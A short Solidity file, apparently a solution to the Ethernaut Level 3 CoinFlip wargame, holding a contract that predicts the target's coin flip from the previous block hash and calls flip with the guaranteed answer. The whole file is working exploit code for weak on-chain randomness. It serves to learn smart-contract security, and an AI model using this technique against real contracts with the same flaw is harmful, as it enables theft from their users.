// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @notice Inteface relating to the CoinFlip contract found in Ethernaut Level 3
 * @notice Full contract can be found in the ethernaut directory of this repo 
 */
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip private _coinFlipContract;

    constructor(address coinFlipContractAddress) {
        _coinFlipContract = ICoinFlip(coinFlipContractAddress);
    }

    function guaranteeGuess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        if (coinFlip == 1) {
            _coinFlipContract.flip(true);
        } else {
            _coinFlipContract.flip(false);
        }
    }
}
